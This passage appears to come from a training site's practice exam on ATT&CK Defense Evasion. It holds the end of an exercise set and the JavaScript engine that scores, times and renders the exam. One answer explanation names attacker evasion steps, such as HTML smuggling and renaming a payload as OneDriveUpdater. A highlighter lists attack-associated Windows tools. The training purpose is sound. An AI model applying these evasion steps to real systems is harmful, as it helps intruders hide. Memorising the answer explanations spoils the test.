      {id:"i3", h:"Block unsigned binaries from user-writable paths via execution prevention (M1038)", z:"z2"},
      {id:"i4", h:"Rename the next stage to OneDriveUpdater and move it to a signed directory (T1036.004 / T1036.005)", z:"z1"}]},
   explain:"<p>Blue cards are detection and prevention anchored in the observed chain: the mshta&rarr;PowerShell parent-child pair with an encoded argument is a high-fidelity analytic, and execution prevention (M1038) on unsigned binaries in user-writable paths kills the final payload delivery. Red cards are the attacker&rsquo;s next evasion steps: HTML Smuggling (T1027.006) sneaks the payload past mail and proxy inspection by constructing it inside the browser, and renaming/relocating the stage (T1036.004/T1036.005) refreshes the masquerade your current detections keyed on. Training value: the same chain read from both sides shows <em>why</em> TA0005 techniques evolve in waves &mdash; every blue analytic pushes the red side to a new costume.</p>",
   study:"dual-perspective reading of a T1218.005 attack chain."}
];


</script>
<script>
/* Cyber Pulse Academy practice-exam engine — TA0005 Defense Evasion (4 severity tiers).
   Vanilla JS, no external requests. Implements: partial-credit scoring, Check-triggered
   auto-pause, manual pause, skip + review pool, hints with credit cost, results + retake,
   site handshake and single-shot score reporting. */
(function () {
  "use strict";

  var CFG = CONFIG, INTROD = INTRO, EXS = EXERCISES;

  /* ---------- small helpers ---------- */
  function $id(i) { return document.getElementById(i); }
  function h(tag, cls, html) { var e = document.createElement(tag); if (cls) e.className = cls; if (html != null) e.innerHTML = html; return e; }
  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"); }
  function shuffle(a) { a = a.slice(); for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
  function fmtTime(s) { s = Math.max(0, s | 0); var m = (s / 60) | 0, r = s % 60; return (m < 10 ? "0" : "") + m + ":" + (r < 10 ? "0" : "") + r; }
  function byId(id) { for (var i = 0; i < EXS.length; i++) if (EXS[i].id === id) return EXS[i]; return null; }
  function posOf(id) { for (var i = 0; i < S.order.length; i++) if (EXS[S.order[i]].id === id) return i; return -1; }

  /* Mandatory reusable scoring function: max(0, (H - W) / N) */
  function scoreExercise(selectedItems, correctItems) {
    var N = correctItems.length;
    if (!N) return 1;
    var corr = {}, i;
    for (i = 0; i < N; i++) corr[correctItems[i]] = true;
    var H = 0, W = 0;
    for (i = 0; i < N; i++) if (corr[correctItems[i]] && selectedItems.indexOf(correctItems[i]) !== -1) H++;
    for (i = 0; i < selectedItems.length; i++) if (!corr[selectedItems[i]]) W++;
    return Math.max(0, (H - W) / N);
  }

  /* ---------- lightweight syntax highlighter for logs / commands ---------- */
  var RXHL = /(&quot;[^&]*?&quot;)|([A-Za-z]:\\[^\s,&<]+)|(\b\d+(?:[.,]\d+)?\b)|(\/[A-Za-z:.0-9]+|-[A-Za-z]+[.\w]*|\$\w+)|(\b(?:wevtutil|certutil|sc|net|attrib|powershell|powershell\.exe|mshta|mshta\.exe|rundll32|rundll32\.exe|regsvr32|regsvr32\.exe|wmic|schtasks|reg|taskkill|vssadmin|sdelete|bcdedit|installutil|msbuild|Get-WinEvent|Get-MpComputerStatus|Get-MpPreference|Set-MpPreference|Add-MpPreference|Clear-EventLog|Stop-Service|Select-Object|Where-Object|Format-List|Export-Clixml|WinDefend|Security|System|Sysmon|Operationally)\b)/g;
  function hl(text) {
    var s = esc(text);
    return s.replace(RXHL, function (m, str, path, num, flag, kw) {
      if (str) return '<span class="tok-str">' + str + "</span>";
      if (path) return '<span class="tok-path">' + path + "</span>";
      if (num) return '<span class="tok-num">' + num + "</span>";
      if (flag) return '<span class="tok-flag">' + flag + "</span>";
      return '<span class="tok-kw">' + kw + "</span>";
    });
  }
  function bindLogFilters(root) {
    Array.prototype.forEach.call(root.querySelectorAll(".logpanel"), function (p) {
      var inp = p.querySelector(".logfilter");
      if (!inp || inp.getAttribute("data-bound")) return;
      inp.setAttribute("data-bound", "1");
      inp.addEventListener("input", function () {
        var q = inp.value.toLowerCase();
        Array.prototype.forEach.call(p.querySelectorAll(".logline"), function (l) {
          var match = !q || l.textContent.toLowerCase().indexOf(q) !== -1;
          l.style.display = match ? "" : "none";
          if (q && match) l.classList.add("hit"); else l.classList.remove("hit");
        });
      });
    });
    /* One-time syntax highlighting of plain-text log lines (spec: the log
       viewer mimics Kibana/Splunk with highlighting + a filter box). */
    Array.prototype.forEach.call(root.querySelectorAll(".logline"), function (l) {
      if (l.getAttribute("data-hl")) return;
      l.setAttribute("data-hl", "1");
      l.innerHTML = hl(l.textContent);
    });
  }
  function highlightCodeIn(root) {
    var pres = root.querySelectorAll("pre.code");
    Array.prototype.forEach.call(pres, function (p) {
      var t = p.textContent;
      p.innerHTML = hl(t);
    });
  }

  /* ---------- global state ---------- */
  var S = {
    screen: "intro",          /* intro | exam | review | results */
    order: [], pos: 0,
    cur: null, reviewFlag: false,
    answered: {}, skipped: {},
    score: 0, answeredN: 0,
    hints: {},                /* exId -> {used, shown} */
    attempt: 0, reported: false,
    user: { username: "", country: "", theme: "", locale: "" },
    tm: { state: "IDLE", remaining: 0, iv: null, manualMs: 0, autoMs: 0, pauseStart: 0, prev: "RUNNING" },
    reduced: { left: 0, total: 0 }
  };

  /* ---------- timer state machine ----------
     States: IDLE, RUNNING, PAUSED_MANUAL, PAUSED_AUTO_CHECK, ENDED.
     Check -> PAUSED_AUTO_CHECK (first action, before feedback renders).
     Next / Final Submit -> RUNNING or ENDED.
     Skip / Hint -> never change the state.
     Manual Pause on top of auto-pause -> PAUSED_MANUAL; Resume returns to PAUSED_AUTO_CHECK. */
  function setTimerState(st) {
    if (S.tm.state === st) return;
    var was = S.tm.state;
    /* Charge elapsed pause time to the state we are LEAVING, then re-arm the
       clock whenever a new pause segment starts (manual on top of auto-pause
       produces three correctly-attributed segments). */
    if (was === "PAUSED_MANUAL") S.tm.manualMs += Date.now() - S.tm.pauseStart;
    else if (was === "PAUSED_AUTO_CHECK") S.tm.autoMs += Date.now() - S.tm.pauseStart;
    if (st === "PAUSED_MANUAL" || st === "PAUSED_AUTO_CHECK") S.tm.pauseStart = Date.now();
    S.tm.state = st;
    renderTimer();
  }
  function tick() {
    if (S.tm.state !== "RUNNING") return;
    if (S.reduced.total > 0 && S.cur && S.cur.ex && S.cur.ex.ix && S.cur.ex.ix.reduced && !S.cur.graded) {
      S.reduced.left--;
      renderReduced();
      if (S.reduced.left <= 0) { onCheck(); return; }
    }
    S.tm.remaining--;
    if (S.tm.remaining <= 0) { S.tm.remaining = 0; renderTimer(); endByTimeout(); return; }
    renderTimer();
  }
  function startExamTimer() {
    S.tm.remaining = CFG.minutes * 60;
    setTimerState("RUNNING");
    if (!S.tm.iv) S.tm.iv = setInterval(tick, 1000);
  }
  function endByTimeout() {
    setTimerState("ENDED");
    showResults("Time ran out. Exercises you never answered are excluded from the score.");
  }

  /* ---------- play order (terminals stay on fixed, non-adjacent slots) ---------- */
  function buildOrder() {
    var n = EXS.length, order = new Array(n), free = [], i;
    for (i = 0; i < n; i++) free.push(i);
    var fixedIdx = [];
    EXS.forEach(function (ex, idx) {
      if (ex.slot) { order[ex.slot - 1] = idx; fixedIdx.push(idx); }
    });
    free = free.filter(function (p) { return order[p] === undefined; });
    var rest = shuffle(EXS.map(function (e, idx) { return idx; }).filter(function (idx) { return fixedIdx.indexOf(idx) === -1; }));
    var spots = shuffle(free);
    for (i = 0; i < rest.length; i++) order[spots[i]] = rest[i];
    S.order = order;
  }

  /* ---------- score display ---------- */
  function renderScore() {
    var el = $id("h-score");
    if (!el) return;
    var pct = S.answeredN ? Math.round((S.score / S.answeredN) * 100) : 0;
    el.innerHTML = '<span class="hlab">Score</span> <strong>' + (Math.round(S.score * 10) / 10).toFixed(1) + " / " + S.answeredN + "</strong> <span class='dim'>(" + pct + "%)</span>";
  }
  function renderTimer() {
    var el = $id("h-timer");
    if (!el) return;
    var t = fmtTime(S.tm.remaining), cls = "timerbox", txt = "";
    if (S.tm.state === "RUNNING") { cls += " state-run"; txt = "&#9654; Running &mdash; " + t; }
    else if (S.tm.state === "PAUSED_MANUAL") { cls += " state-manual"; txt = "&#9208; Paused &mdash; manual (press Resume)"; }
    else if (S.tm.state === "PAUSED_AUTO_CHECK") { cls += " state-auto"; txt = "&#9208; Paused &mdash; reviewing feedback (resumes on Next)"; }
    else if (S.tm.state === "ENDED") { cls += " state-ended"; txt = "&#9633; Ended"; }
    else { cls += " state-run"; txt = "&#9654; " + t; }
    el.className = cls;
    el.innerHTML = txt;
  }
  function renderReduced() {
    var el = $id("reduced-timer");
    if (!el) return;
    el.innerHTML = "&#9201; Terminal time left in this exercise: <strong>" + fmtTime(S.reduced.left) + "</strong> (of " + fmtTime(S.reduced.total) + "). When it reaches 0 the exercise is graded as it stands.";
  }

  /* ---------- header ---------- */
  function makeHeader() {
    var hd = h("header", "exhdr");
    hd.id = "exhdr";
    hd.innerHTML =
      '<div class="hgrp"><span class="hlab">Exercise</span> <strong id="h-count"></strong></div>' +
      '<div class="hgrp"><span class="badge sev-' + CFG.sevClass + '">' + CFG.sevIcon + " " + CFG.sevName + "</span></div>" +
      '<div class="hgrp"><span id="h-timer" class="timerbox state-run" aria-live="polite"></span></div>' +
      '<div class="hgrp" id="h-score"></div>' +
      '<div class="hgrp hbtns">' +
      '<button type="button" class="btn ghost" id="b-hint">Hint (&minus;10%)</button>' +
      '<button type="button" class="btn ghost" id="b-pause">Pause</button>' +
      '<button type="button" class="btn ghost" id="b-skip">Skip</button>' +
      '<button type="button" class="btn ghost" id="b-finish">Finish</button>' +
      "</div>";
    hd.querySelector("#b-hint").addEventListener("click", onHint);
    hd.querySelector("#b-pause").addEventListener("click", onPause);
    hd.querySelector("#b-skip").addEventListener("click", onSkip);
    hd.querySelector("#b-finish").addEventListener("click", onFinishButton);
    return hd;
  }
  function updateHeader() {
    var c = $id("h-count");
    if (c && S.cur) c.textContent = (S.pos + 1) + " of " + S.order.length;
    var skip = $id("b-skip"), hint = $id("b-hint");
    if (skip) skip.disabled = !!(S.cur && S.cur.graded);
    if (hint) {
      var used = S.cur && S.hints[S.cur.ex.id] && S.hints[S.cur.ex.id].used;
      hint.disabled = !!used || !!(S.cur && S.cur.graded);
    }
  }

  /* ---------- intro ---------- */
  function renderIntro() {
    S.screen = "intro";
    var root = $id("app");
    root.innerHTML = "";
    var wrap = h("div", "intro");
    wrap.innerHTML = INTROD.html;
    var bar = h("div", "startbar");
    var btn = h("button", "btn primary big");
    btn.id = "start-btn"; btn.type = "button";
    btn.textContent = "Start the exam";
    btn.addEventListener("click", startExam);
    bar.appendChild(btn);
    wrap.appendChild(bar);
    root.appendChild(wrap);
    window.scrollTo(0, 0);
  }

  function startExam() {
    S.attempt++; S.reported = false;
    S.answered = {}; S.skipped = {};
    S.score = 0; S.answeredN = 0; S.hints = {};
    S.pos = 0; S.reviewFlag = false; S.cur = null;
    S.reduced = { left: 0, total: 0 };
    S.tm.manualMs = 0; S.tm.autoMs = 0;
    if (S.tm.iv) { clearInterval(S.tm.iv); S.tm.iv = null; }
    S.tm.state = "IDLE";
    buildOrder();
    S.screen = "exam";
    startExamTimer();
    renderExamFrame();
    renderCurrent();
  }

  /* ---------- exam frame ---------- */
  function renderExamFrame() {
    var root = $id("app");
    root.innerHTML = "";
    root.appendChild(makeHeader());
    var main = h("div");
    main.id = "exam-main";
    root.appendChild(main);
  }

  function renderCurrent() {
    var main = $id("exam-main");
    main.innerHTML = "";
    var exIdx = S.order[S.pos];
    var ex = EXS[exIdx];
    var fromReview = S.reviewFlag;
    S.reviewFlag = false;
    S.cur = { ex: ex, idx: exIdx, graded: false, credit: 0, items: null, answerHtml: "", fromReview: fromReview, widget: null };
    if (!S.hints[ex.id]) S.hints[ex.id] = { used: false, shown: false };
    S.reduced = ex.ix.reduced ? { left: ex.ix.reduced, total: ex.ix.reduced } : { left: 0, total: 0 };

    var card = h("div", "excard");

    /* SCENARIO block (collapsible) */
    var sc = h("section", "blk blk-scenario");
    var scHead = h("div", "blk-h");
    scHead.innerHTML = '<span class="bicon" aria-hidden="true">&#9636;</span> SCENARIO';
    var caret = h("button", "minicaret");
    caret.type = "button";
    caret.setAttribute("aria-expanded", "true");
    caret.innerHTML = "&#9662; hide scenario";
    scHead.appendChild(caret);
    var sum = h("button", "sumline");
    sum.type = "button";
    sum.setAttribute("aria-expanded", "true");
    sum.innerHTML = '<span class="sumtxt">' + ex.summary + '</span><span class="caret">&#9662; collapse</span>';
    var scbody = h("div", "blk-body");
    scbody.innerHTML = ex.scenario;
    function setScenarioOpen(open) {
      scbody.style.display = open ? "" : "none";
      caret.setAttribute("aria-expanded", String(open));
      caret.innerHTML = open ? "&#9662; hide scenario" : "&#9656; show scenario";
      sum.style.display = open ? "none" : "";
    }
    caret.addEventListener("click", function () { setScenarioOpen(scbody.style.display === "none"); });
    sum.addEventListener("click", function () { setScenarioOpen(true); });
    sc.appendChild(scHead);
    sc.appendChild(sum);
    sc.appendChild(scbody);
    card.appendChild(sc);

    /* QUESTION block */
    var q = h("section", "blk blk-question");
    q.innerHTML = '<div class="blk-h"><span class="bicon" aria-hidden="true">&#10067;</span> QUESTION</div>' +
      '<div class="blk-body"><p class="qtext">' + ex.question + "</p></div>";
    card.appendChild(q);

    /* YOUR ANSWER block */
    var ans = h("section", "blk blk-answer");
    ans.innerHTML = '<div class="blk-h"><span class="bicon" aria-hidden="true">&#9998;</span> YOUR ANSWER</div>';
    var ansBody = h("div", "blk-body");
    S.cur.widget = buildWidget(ex);
    ansBody.appendChild(S.cur.widget.node);
    ans.appendChild(ansBody);
    card.appendChild(ans);

    /* hint panel */
    var hintPanel = h("div");
    hintPanel.id = "hint-panel";
    if (S.hints[ex.id].shown) hintPanel.innerHTML = '<div class="hintbox"><strong>Hint:</strong> ' + esc(ex.hint) + "</div>";
    card.appendChild(hintPanel);

    /* footer controls */
    var foot = h("div", "stepctrl");
    if (ex.ix.reduced) {
      foot.appendChild(h("span", "reducednote", ""));
      foot.lastChild.id = "reduced-timer";
    }
    var chk = h("button", "btn primary");
    chk.id = "b-check"; chk.type = "button"; chk.textContent = "Check";
    chk.addEventListener("click", onCheck);
    var nxt = h("button", "btn green");
    nxt.id = "b-next"; nxt.type = "button"; nxt.textContent = "Next";
    nxt.disabled = true;
    nxt.addEventListener("click", onNext);
    foot.appendChild(chk);
    foot.appendChild(nxt);
    card.appendChild(foot);

    /* feedback container (below the three blocks) */
    var fb = h("div");
    fb.id = "fb";
    fb.className = "fb";
    fb.style.display = "none";
    fb.addEventListener("click", function (ev) {
      var t = ev.target;
      if (t && t.classList && t.classList.contains("copybtn")) {
        var pre = t.parentNode.querySelector("pre.code");
        if (pre) copyText(pre.textContent, t);
      }
    });
    card.appendChild(fb);

    main.appendChild(card);

    highlightCodeIn(card);
    bindLogFilters(card);
    renderTimer();
    renderScore();
    updateHeader();
    if (ex.ix.reduced) renderReduced();
    window.scrollTo(0, 0);
  }

  function copyText(text, btn) {
    var done = function () { if (btn) { var o = btn.textContent; btn.textContent = "Copied"; setTimeout(function () { btn.textContent = o; }, 1200); } };
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(done, done); return; }
    } catch (e) { /* fall through */ }
    try {
      var ta = document.createElement("textarea");
      ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
      document.body.appendChild(ta); ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
    } catch (e2) { /* clipboard unavailable */ }
    done();
  }

  function onHint() {
    if (!S.cur || S.cur.graded) return;
    var st = S.hints[S.cur.ex.id];
    if (!st) st = S.hints[S.cur.ex.id] = { used: false, shown: false };
    if (st.used) return;
    st.used = true; st.shown = true;
    var p = $id("hint-panel");
    if (p) p.innerHTML = '<div class="hintbox"><strong>Hint:</strong> ' + esc(S.cur.ex.hint) + "</div>";
    updateHeader();
    /* Hint never changes the timer state and never pauses the clock. */
  }

  function onPause() {
    if (S.screen !== "exam" && S.screen !== "review") return;
    if (S.tm.state === "RUNNING" || S.tm.state === "PAUSED_AUTO_CHECK") {
      S.tm.prev = S.tm.state;
      setTimerState("PAUSED_MANUAL");
      showPauseOverlay();
    }
  }
  function showPauseOverlay() {
    removePauseOverlay();
    var ov = h("div", "overlay");
    ov.id = "pause-overlay";
    ov.innerHTML = '<div class="overlaybox"><h2>&#9208; Paused</h2><p>The timer is stopped. The exercise is hidden so you cannot read or answer it while you take a break.</p><button type="button" class="btn primary big" id="b-resume">Resume</button></div>';
    document.body.appendChild(ov);
    $id("b-resume").addEventListener("click", onResume);
  }
  function removePauseOverlay() {
    var ov = $id("pause-overlay");
    if (ov && ov.parentNode) ov.parentNode.removeChild(ov);
  }
  function onResume() {
    if (S.tm.state !== "PAUSED_MANUAL") return;
    removePauseOverlay();
    setTimerState(S.tm.prev === "PAUSED_AUTO_CHECK" ? "PAUSED_AUTO_CHECK" : "RUNNING");
  }

  function onFinishButton() {
    if (S.screen !== "exam" && S.screen !== "review") return;
    removePauseOverlay();
    if (S.screen === "review") { showResults(null); return; } /* Finish on the review screen = submit now */
    toReviewOrResults();
  }

  function toReviewOrResults() {
    if (Object.keys(S.skipped).length > 0) renderReview();
    else showResults(null);
  }

  /* ---------- widgets ---------- */
  function buildWidget(ex) {
    if (ex.kind === "qcm" || ex.kind === "multi") return buildChoice(ex, ex.kind === "multi");
    if (ex.kind === "dnd") return buildDnd(ex);
    if (ex.kind === "order") return buildOrderWidget(ex);
    if (ex.kind === "fill") return buildFill(ex);
    if (ex.kind === "term") return buildTerm(ex);
    if (ex.kind === "branch") return buildBranch(ex);
    return buildChoice(ex, false);
  }

  function buildChoice(ex, multi) {
    var ix = ex.ix;
    var opts = shuffle(ix.opts);
    var sel = {};
    var box = h("div", "opts");
    opts.forEach(function (o, i) {
      var letter = String.fromCharCode(65 + i);
      var b = h("button", "opt");
      b.type = "button";
      b.setAttribute("aria-pressed", "false");
      b.innerHTML = '<span class="okey">' + letter + '.</span><span class="otxt">' + o.h + "</span>" + (multi ? '<span class="obox" aria-hidden="true"></span>' : "");
      b.addEventListener("click", function () {
        if (S.cur && S.cur.graded) return;
        if (multi) {
          sel[o.id] = !sel[o.id];
          b.classList.toggle("sel", !!sel[o.id]);
          b.setAttribute("aria-pressed", String(!!sel[o.id]));
        } else {
          sel = {}; sel[o.id] = true;
          Array.prototype.forEach.call(box.children, function (c) { c.classList.remove("sel"); c.setAttribute("aria-pressed", "false"); });
          b.classList.add("sel");
          b.setAttribute("aria-pressed", "true");
        }
      });
      box.appendChild(b);
    });
    return {
      node: box,
      get: function () { return Object.keys(sel).filter(function (k) { return sel[k]; }); },
      lock: function () { Array.prototype.forEach.call(box.children, function (c) { c.disabled = true; }); }
    };
  }

  function buildDnd(ex) {
    var ix = ex.ix;
    var wrap = h("div", "dndwrap");
    var zname = {};
    ix.zones.forEach(function (z) { zname[z.id] = z.h; });
    var bankLabel = h("div", "bank-label", "Drag each item into a zone (or click an item, then click a zone):");
    var bank = h("div", "bank");
    bank.setAttribute("aria-label", "Items to place");
    var zonesLabel = h("div", "zones-label", "Drop zones:");
    var zones = h("div", "zones");
    var placement = {}, picked = null, itemEls = {};
    wrap.appendChild(bankLabel); wrap.appendChild(bank);
    wrap.appendChild(zonesLabel); wrap.appendChild(zones);

    function refresh() {
      Array.prototype.forEach.call(zones.children, function (z) {
        var list = z.querySelector(".zitems");
        list.innerHTML = "";
        var any = false;
        Object.keys(placement).forEach(function (itemId) {
          if (placement[itemId] === z.getAttribute("data-zone")) {
            any = true;
            list.appendChild(itemEls[itemId]);
          }
        });
        var empty = z.querySelector(".zempty");
        if (empty) empty.style.display = any ? "none" : "";
      });
      Array.prototype.forEach.call(bank.children, function (c) {
        if (c.getAttribute && c.getAttribute("data-item") && placement[c.getAttribute("data-item")]) {
          bank.removeChild(c);
        }
      });
    }
    function place(itemId, zoneId) {
      if (!itemId || !zoneId) return;
      placement[itemId] = zoneId;
      if (picked === itemId) picked = null;
      refresh();
    }
    ix.items.forEach(function (it) {
      var b = h("button", "ditem");
      b.type = "button";
      b.setAttribute("draggable", "true");
      b.setAttribute("data-item", it.id);
      b.innerHTML = it.h;
      b.addEventListener("dragstart", function (ev) {
        if (S.cur && S.cur.graded) { ev.preventDefault(); return; }
        try { ev.dataTransfer.setData("text/plain", it.id); } catch (e) { /* older engines */ }
      });
      b.addEventListener("click", function () {
        if (S.cur && S.cur.graded) return;
        if (placement[it.id]) { /* return to bank */
          delete placement[it.id];
          bank.appendChild(b);
          refresh();
        } else {
          if (picked) { var prev = itemEls[picked]; if (prev) prev.classList.remove("picked"); }
          picked = it.id;
          b.classList.add("picked");
        }
      });
      itemEls[it.id] = b;
      bank.appendChild(b);
    });
    ix.zones.forEach(function (z) {
      var zd = h("div", "zone");
      zd.setAttribute("data-zone", z.id);
      /* Keyboard parity for click-to-place: a zone is a focusable button-like
         target; Enter or Space drops the picked item. */
      zd.setAttribute("role", "button");
      zd.setAttribute("tabindex", "0");
      zd.setAttribute("aria-label", "Drop zone: " + z.h.replace(/<[^>]+>/g, ""));
      zd.innerHTML = '<div class="zlabel">' + z.h + '</div><div class="zitems"></div><div class="zempty">Drop here</div>';
      zd.addEventListener("dragover", function (ev) { ev.preventDefault(); zd.classList.add("droptarget"); });
      zd.addEventListener("dragleave", function () { zd.classList.remove("droptarget"); });
      zd.addEventListener("drop", function (ev) {
        ev.preventDefault();
        zd.classList.remove("droptarget");
        if (S.cur && S.cur.graded) return;
        var itemId = null;
        try { itemId = ev.dataTransfer.getData("text/plain"); } catch (e) { /* older engines */ }
        if (!itemId) itemId = picked;
        place(itemId, z.id);
      });
      zd.addEventListener("click", function () {
        if (S.cur && S.cur.graded) return;
        if (picked) place(picked, z.id);
      });
      zd.addEventListener("keydown", function (ev) {
        if (ev.key !== "Enter" && ev.key !== " " && ev.key !== "Spacebar") return;
        if (S.cur && S.cur.graded) return;
        ev.preventDefault();
        if (picked) place(picked, z.id);
      });
      zones.appendChild(zd);
    });
    return {
      node: wrap,
      get: function () { return placement; },
      lock: function () {
        Array.prototype.forEach.call(wrap.querySelectorAll("button"), function (b) { b.disabled = true; });
      }
    };
  }

  function buildOrderWidget(ex) {
    var ix = ex.ix;
    var list = h("div", "olist");
    var labels = {};
    ix.items.forEach(function (it) { labels[it.id] = it.h; });
    var cur = shuffle(ix.items.map(function (x) { return x.id; }));
    function mv2(i, j) {
      if (S.cur && S.cur.graded) return;
      if (i === j || i < 0 || j < 0 || i >= cur.length || j >= cur.length) return;
      var t = cur[i]; cur[i] = cur[j]; cur[j] = t;
      render();
    }
    function render() {
      list.innerHTML = "";
      cur.forEach(function (id, i) {
        var row = h("div", "orow");
        row.setAttribute("draggable", "true");
        row.setAttribute("data-oid", id);
        row.innerHTML = '<span class="okey">' + (i + 1) + '.</span><span class="otxt">' + labels[id] + "</span>" +
          '<span class="obtns">' +
          '<button type="button" class="mini" aria-label="Move up" data-mv="up">&#8593;</button>' +
          '<button type="button" class="mini" aria-label="Move down" data-mv="down">&#8595;</button></span>';
        row.querySelector('[data-mv="up"]').addEventListener("click", function () { mv2(i, i - 1); });
        row.querySelector('[data-mv="down"]').addEventListener("click", function () { mv2(i, i + 1); });
        row.addEventListener("dragstart", function (ev) { try { ev.dataTransfer.setData("text/plain", String(i)); } catch (e) { /* older engines */ } });
        row.addEventListener("dragover", function (ev) { ev.preventDefault(); });
        row.addEventListener("drop", function (ev) {
          ev.preventDefault();
          var from = parseInt(ev.dataTransfer.getData("text/plain"), 10);
          if (!isNaN(from)) mv2(from, i);
        });
        list.appendChild(row);
      });
    }
    render();
    return {
      node: list,
      get: function () { return cur.slice(); },
      lock: function () { Array.prototype.forEach.call(list.querySelectorAll("button"), function (b) { b.disabled = true; }); }
    };
  }

  function buildFill(ex) {
    var ix = ex.ix;
    var wrap = h("div", "fillwrap");
    var sent = h("div", "fillsent");
    var bankLabel = h("div", "bank-label", "Word bank (click a word to fill the next empty blank):");
    var bank = h("div", "bank");
    var slots = ix.slots.map(function () { return null; });
    var chipOf = {};
    function renderSentence() {
      sent.innerHTML = "";
      ix.segs.forEach(function (sg, i) {
        sent.appendChild(h("span", null, sg));
        if (i < ix.slots.length) {
          (function (idx) {
            var sb = h("button", "slot" + (slots[idx] ? " filled" : ""));
            sb.type = "button";
            sb.innerHTML = slots[idx] ? esc(slots[idx]) : "&nbsp;____&nbsp;";
            sb.addEventListener("click", function () {
              if (S.cur && S.cur.graded) return;
              if (slots[idx]) { bankReturn(idx); }
            });
            sent.appendChild(sb);
          })(i);
        }
      });
    }
    function renderBank() {
      bank.innerHTML = "";
      ix.bank.forEach(function (w) {
        var used = slots.indexOf(w) !== -1;
        var c = h("button", "chip");
        c.type = "button";
        c.innerHTML = esc(w);
        c.disabled = used;
        c.addEventListener("click", function () {
          if (S.cur && S.cur.graded) return;
          var target = -1;
          for (var i = 0; i < slots.length; i++) if (slots[i] === null) { target = i; break; }
          if (target === -1) return;
          slots[target] = w;
          renderSentence(); renderBank();
        });
        chipOf[w] = c;
        bank.appendChild(c);
      });
    }
    function bankReturn(idx) {
      slots[idx] = null;
      renderSentence(); renderBank();
    }
    renderSentence(); renderBank();
    wrap.appendChild(sent); wrap.appendChild(bankLabel); wrap.appendChild(bank);
    return {
      node: wrap,
      get: function () { return slots.slice(); },
      lock: function () { Array.prototype.forEach.call(wrap.querySelectorAll("button"), function (b) { b.disabled = true; }); }
    };
  }

  function normCmd(c) { return String(c).replace(/\s+/g, " ").trim().toLowerCase(); }
  function matchAll(elems, n) { for (var i = 0; i < elems.length; i++) if (!elems[i].re.test(n)) return false; return true; }
  function hitAny(list, n) { for (var i = 0; i < list.length; i++) if (list[i].re.test(n)) return true; return false; }

  function buildTerm(ex) {
    var ix = ex.ix;
    var wrap = h("div", "termwrap");
    if (ix.syntax) wrap.appendChild(h("div", "syntax", ix.syntax));
    if (ix.shape) wrap.appendChild(h("div", "shape", ix.shape));
    var scr = h("div", "termscr");
    scr.setAttribute("aria-label", "Simulated terminal output");
    scr.innerHTML = '<div class="tline dim">Simulation only &mdash; nothing here runs for real. Type a command, press Run or Enter to try it, then press Check to submit.</div>';
    var inline = h("div", "terminline");
    inline.innerHTML = '<span class="tprompt">' + esc(ix.prompt) + "</span>";
    var inp = h("input", "tinput");
    inp.type = "text";
    inp.setAttribute("autocomplete", "off");
    inp.setAttribute("autocapitalize", "off");
    inp.setAttribute("spellcheck", "false");
    inp.setAttribute("aria-label", "Type the command");
    var run = h("button", "btn ghost mini");
    run.type = "button"; run.textContent = "Run";
    inline.appendChild(inp); inline.appendChild(run);
    wrap.appendChild(scr); wrap.appendChild(inline);
    var lastCmd = "";
    function runCmd() {
      var v = inp.value;
      if (!v.trim()) return;
      lastCmd = v;
      var line = h("div", "tline");
      line.innerHTML = '<span class="tprompt">' + esc(ix.prompt) + "</span> " + esc(v);
      scr.appendChild(line);
      var n = normCmd(v);
      if (matchAll(ix.elems, n) && !hitAny(ix.forbidden || [], n)) {
        (ix.out && ix.out.length ? ix.out : ["The command completed successfully."]).forEach(function (l) {
          scr.appendChild(h("div", "tline out", l));
        });
      } else if (hitAny(ix.forbidden || [], n)) {
        scr.appendChild(h("div", "tline warn", ix.warn || "Careful: this command changes or destroys data. It will be marked wrong if you submit it."));
      } else {
        scr.appendChild(h("div", "tline dim", ix.miss || "The command did not match the expected action. Check the tool, the options and the target."));
      }
      scr.scrollTop = scr.scrollHeight;
    }
    run.addEventListener("click", runCmd);
    inp.addEventListener("keydown", function (ev) { if (ev.key === "Enter") { ev.preventDefault(); runCmd(); } });
    return {
      node: wrap,
      get: function () { return inp.value.trim() ? inp.value : lastCmd; },
      lock: function () { inp.disabled = true; run.disabled = true; }
    };
  }

  function buildBranch(ex) {
    var ix = ex.ix;
    var wrap = h("div", "branchwrap");
    var area = h("div", "steparea");
    var ctrl = h("div", "branchctrl");
    var step = 0;
    var chosen = new Array(ix.steps.length);
    for (var i0 = 0; i0 < ix.steps.length; i0++) chosen[i0] = null;
    function optLabel(st, id) {
      for (var i = 0; i < st.opts.length; i++) if (st.opts[i].id === id) return st.opts[i].h;
      return "(no answer)";
    }
    function renderStep() {
      area.innerHTML = "";
      var st = ix.steps[step];
      area.appendChild(h("div", "steplab", "STEP " + (step + 1) + " OF " + ix.steps.length));
      var opts = shuffle(st.opts);
      opts.forEach(function (o, i) {
        var b = h("button", "opt");
        b.type = "button";
        b.innerHTML = '<span class="okey">' + String.fromCharCode(65 + i) + '.</span><span class="otxt">' + o.h + "</span>";
        b.addEventListener("click", function () {
          if (S.cur && S.cur.graded) return;
          chosen[step] = o.id;
          Array.prototype.forEach.call(area.querySelectorAll(".opt"), function (c) { c.classList.remove("sel"); });
          b.classList.add("sel");
        });
        area.appendChild(b);
      });
      ctrl.innerHTML = "";
      if (step < ix.steps.length - 1) {
        var cb = h("button", "btn primary");
        cb.type = "button"; cb.textContent = "Confirm & continue";
        cb.addEventListener("click", function () {
          if (chosen[step] == null) {
            var f = h("span", "flash", "Choose an option first.");
            ctrl.appendChild(f);
            setTimeout(function () { if (f.parentNode) f.parentNode.removeChild(f); }, 1600);
            return;
          }
          step++;
          renderStep();
        });
        ctrl.appendChild(cb);
        ctrl.appendChild(h("span", "dim", "Confirming a step does not pause the timer."));
      } else {
        ctrl.appendChild(h("span", "dim", "Final step. Now press Check to grade the whole decision chain."));
      }
    }
    renderStep();
    wrap.appendChild(area); wrap.appendChild(ctrl);
    return {
      node: wrap,
      get: function () { return chosen; },
      lock: function () { Array.prototype.forEach.call(wrap.querySelectorAll("button"), function (b) { b.disabled = true; }); }
    };
  }

  function smoothScroll(el) {
    var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
